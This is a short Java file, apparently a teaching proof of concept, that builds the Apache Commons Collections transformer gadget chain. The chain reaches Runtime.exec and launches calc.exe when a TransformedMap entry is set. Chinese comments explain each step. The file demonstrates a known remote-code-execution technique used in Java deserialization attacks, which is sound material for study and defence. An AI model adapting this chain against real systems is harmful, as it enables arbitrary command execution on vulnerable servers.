import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class RceTest {
    public void rceTest(){
        //transformer链
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class }, new Object[] {"calc.exe"})};
        //能够执行代码的ChainedTransformer
        Transformer transformedChain = new ChainedTransformer(transformers);
        //创建一个map
        Map innerMap = new HashMap();
        innerMap.put("1", "test");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        //setValue()时，会触发ChainedTransformer中的一系列变换函数
        onlyElement.setValue("test2");
    }

}
